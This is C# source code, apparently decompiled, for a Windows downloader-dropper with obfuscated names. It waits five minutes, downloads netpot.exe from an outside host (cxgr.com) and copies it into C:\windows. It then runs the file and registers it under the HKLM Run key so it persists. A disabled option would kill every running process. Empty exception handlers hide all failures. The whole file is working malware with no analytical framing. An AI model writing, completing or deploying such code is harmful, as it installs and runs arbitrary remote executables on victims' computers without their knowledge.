using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace pZNDkB3;

internal class pZNDkB3pZNDkB59 : Form
{
	private static string url = "http://cxgr.com/netpot.exe";

	private static string file = "netpot.exe";

	private static string dest = "C:\\windows\\netpot.exe";

	private static bool blnC = true;

	private static bool blnE = true;

	private static bool blnR = false;

	private static bool blnS = true;

	private static void Main(string[] args)
	{
		try
		{
			if (File.Exists(file))
			{
				File.Delete(file);
			}
			Thread.Sleep(300000);
			WebClient webClient = new WebClient();
			webClient.DownloadFile(url, file);
			if (blnC)
			{
				File.Copy(file, dest, overwrite: true);
				File.Delete(file);
			}
			if (blnE)
			{
				Process process = new Process();
				process.StartInfo.FileName = dest;
				process.Start();
			}
			if (blnS)
			{
				string keyName = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\";
				string text = (string)Registry.GetValue(keyName, file, file);
				if (text == file)
				{
					Registry.SetValue(keyName, file, dest);
				}
			}
			if (!blnR)
			{
				return;
			}
			try
			{
				Process[] processes = Process.GetProcesses();
				for (int i = 0; i < processes.Length; i++)
				{
					processes[i].Kill();
				}
			}
			catch (Exception)
			{
			}
		}
		catch (Exception)
		{
		}
	}
}
